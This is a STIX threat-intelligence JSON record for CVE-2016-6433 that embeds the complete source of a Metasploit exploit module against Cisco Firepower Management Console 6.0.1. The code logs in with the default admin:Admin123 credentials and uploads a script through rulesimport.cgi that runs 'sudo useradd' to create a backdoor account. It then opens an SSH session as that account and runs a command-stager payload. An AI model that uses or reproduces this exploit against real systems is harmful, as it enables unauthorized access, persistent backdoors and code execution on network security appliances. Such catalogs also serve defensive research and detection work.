{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7d393899-1f58-4031-aabf-7d2f6fe5eeba",
    "created": "2024-08-14T17:03:06.950733Z",
    "modified": "2024-08-14T17:03:06.950737Z",
    "name": "\"Cisco Firepower Management Console 6.0 Post Authentication UserAdd Vulnerability\"",
    "description": " This module exploits a vulnerability found in Cisco Firepower Management Console. The management system contains a configuration flaw that allows the www user to execute the useradd binary, which can be abused to create backdoor accounts. Authentication is required to exploit this vulnerability.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cisco_firepower_useradd.rb",
            "external_id": "cisco_firepower_useradd.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-6433"
        },
        {
            "source_name": "reference",
            "url": "https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Cisco Firepower Management Console 6.0 Post Authentication UserAdd Vulnerability\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Cisco Firepower Management Console.\n        The management system contains a configuration flaw that allows the www user to\n        execute the useradd binary, which can be abused to create backdoor accounts.\n        Authentication is required to exploit this vulnerability.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Matt',  # Original discovery & PoC\n          'sinn3r' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2016-6433' ],\n          [ 'URL', 'https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking' ]\n        ],\n      'Platform'       => 'linux',\n      'Arch'           => ARCH_X86,\n      'Targets'        =>\n        [\n          [ 'Cisco Firepower Management Console 6.0.1 (build 1213)', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2016-10-10',\n      'CmdStagerFlavor'=> %w{ echo },\n      'DefaultOptions' =>\n        {\n          'SSL'        => 'true',\n          'SSLVersion' => 'Auto',\n          'RPORT'      => 443\n        },\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        # admin:Admin123 is the default credential for 6.0.1\n        OptString.new('USERNAME', [true, 'Username for Cisco Firepower Management console', 'admin']),\n        OptString.new('PASSWORD', [true, 'Password for Cisco Firepower Management console', 'Admin123']),\n        OptString.new('NEWSSHUSER', [false, 'New backdoor username (Default: Random)']),\n        OptString.new('NEWSSHPASS', [false, 'New backdoor password (Default: Random)']),\n        OptString.new('TARGETURI', [true, 'The base path to Cisco Firepower Management console', '/']),\n        OptInt.new('SSHPORT', [true, 'Cisco Firepower Management console\\'s SSH port', 22])\n      ])\n  end\n\n  def check\n    # For this exploit to work, we need to check two services:\n    # * HTTP - To create the backdoor account for SSH\n    # * SSH  - To execute our payload\n\n    vprint_status('Checking Cisco Firepower Management console...')\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, '/img/favicon.png?v=6.0.1-1213')\n    })\n\n    if res && res.code == 200\n      vprint_status(\"Console is found.\")\n      vprint_status(\"Checking SSH service.\")\n      begin\n        opts = ssh_client_defaults.merge({\n          port: datastore['SSHPORT'],\n          password: Rex::Text.rand_text_alpha(5),\n          auth_methods: ['password']\n        })\n        ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n          Net::SSH.start(rhost, 'admin', opts)\n        end\n      rescue Timeout::Error\n        vprint_error('The SSH connection timed out.')\n        return Exploit::CheckCode::Unknown\n      rescue Net::SSH::AuthenticationFailed\n        # Hey, it talked. So that means SSH is running.\n        return Exploit::CheckCode::Appears\n      rescue Net::SSH::Exception => e\n        vprint_error(e.message)\n      end\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def get_sf_action_id(sid)\n    requirements = {}\n\n    print_status('Attempting to obtain sf_action_id from rulesimport.cgi')\n\n    uri = normalize_uri(target_uri.path, 'DetectionPolicy/rules/rulesimport.cgi')\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => uri,\n      'cookie' => \"CGISESSID=#{sid}\"\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Failed to obtain rules import requirements.')\n    end\n\n    sf_action_id = res.body.scan(/sf_action_id = '(.+)';/).flatten[1]\n\n    unless sf_action_id\n      fail_with(Failure::Unknown, 'Unable to obtain sf_action_id from rulesimport.cgi')\n    end\n\n    sf_action_id\n  end\n\n  def create_ssh_backdoor(sid, user, pass)\n    uri          = normalize_uri(target_uri.path, 'DetectionPolicy/rules/rulesimport.cgi')\n    sf_action_id = get_sf_action_id(sid)\n    sh_name      = 'exploit.sh'\n\n    print_status(\"Attempting to create an SSH backdoor as #{user}:#{pass}\")\n\n    mime_data = Rex::MIME::Message.new\n    mime_data.add_part('Import', nil, nil, 'form-data; name=\"action_submit\"')\n    mime_data.add_part('file', nil, nil, 'form-data; name=\"source\"')\n    mime_data.add_part('1', nil, nil, 'form-data; name=\"manual_update\"')\n    mime_data.add_part(sf_action_id, nil, nil, 'form-data; name=\"sf_action_id\"')\n    mime_data.add_part(\n      \"sudo useradd -g ldapgroup -p `openssl passwd -1 #{pass}` #{user}; rm /var/sf/SRU/#{sh_name}\",\n      'application/octet-stream',\n      nil,\n      \"form-data; name=\\\"file\\\"; filename=\\\"#{sh_name}\\\"\"\n    )\n\n    send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => uri,\n      'cookie'   => \"CGISESSID=#{sid}\",\n      'ctype'    => \"multipart/form-data; boundary=#{mime_data.bound}\",\n      'data'     => mime_data.to_s,\n      'vars_get' => { 'no_mojo' => '1' },\n    })\n  end\n\n  def generate_new_username\n    datastore['NEWSSHUSER'] || Rex::Text.rand_text_alpha(5)\n  end\n\n  def generate_new_password\n    datastore['NEWSSHPASS'] || Rex::Text.rand_text_alpha(5)\n  end\n\n  def do_login\n    console_user = datastore['USERNAME']\n    console_pass = datastore['PASSWORD']\n    uri          = normalize_uri(target_uri.path, 'login.cgi')\n\n    print_status(\"Attempting to login in as #{console_user}:#{console_pass}\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => uri,\n      'vars_post' => {\n        'username' => console_user,\n        'password' => console_pass,\n        'target'   => ''\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while trying to log in.')\n    end\n\n    res_cookie = res.get_cookies\n    if res.code == 302 && res_cookie.include?('CGISESSID')\n      cgi_sid = res_cookie.scan(/CGISESSID=(\\w+);/).flatten.first\n      print_status(\"CGI Session ID: #{cgi_sid}\")\n      print_good(\"Authenticated as #{console_user}:#{console_pass}\")\n      store_valid_credential(user: console_user, private: console_pass) # changes service_name to http || https\n      return cgi_sid\n    end\n\n    nil\n  end\n\n  def execute_command(cmd, opts = {})\n    @first_exec = true\n    cmd.gsub!(/\\/tmp/, '/usr/tmp')\n\n    # Weird hack for the cmd stager.\n    # Because it keeps using > to write the payload.\n    if @first_exec\n      @first_exec = false\n    else\n      cmd.gsub!(/>>/, ' > ')\n    end\n\n    begin\n      Timeout.timeout(3) do\n        @ssh_socket.exec!(\"#{cmd}\\n\")\n        vprint_status(\"Executing #{cmd}\")\n      end\n    rescue Timeout::Error\n      fail_with(Failure::Unknown, 'SSH command timed out')\n    rescue Net::SSH::ChannelOpenFailed\n      print_status('Trying again due to Net::SSH::ChannelOpenFailed (sometimes this happens)')\n      retry\n    end\n  end\n\n  def init_ssh_session(user, pass)\n    print_status(\"Attempting to log into SSH as #{user}:#{pass}\")\n\n    factory = ssh_socket_factory\n    opts = {\n      auth_methods: ['password', 'keyboard-interactive'],\n      port: datastore['SSHPORT'],\n      use_agent: false,\n      config: false,\n      password: pass,\n      proxy: factory,\n      non_interactive: true\n    }\n\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    begin\n      ssh = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        @ssh_socket = Net::SSH.start(rhost, user, opts)\n      end\n    rescue Net::SSH::Exception => e\n      fail_with(Failure::Unknown, e.message)\n    end\n  end\n\n  def exploit\n    # To exploit the useradd vuln, we need to login first.\n    sid = do_login\n    return unless sid\n\n    # After login, we can call the useradd utility to create a backdoor user\n    new_user = generate_new_username\n    new_pass = generate_new_password\n    create_ssh_backdoor(sid, new_user, new_pass)\n\n    # Log into the SSH backdoor account\n    init_ssh_session(new_user, new_pass)\n\n    begin\n      execute_cmdstager({:linemax => 500})\n    ensure\n      @ssh_socket.close\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-10-10",
    "x_mitre_platforms": [
        "linux'"
    ]
}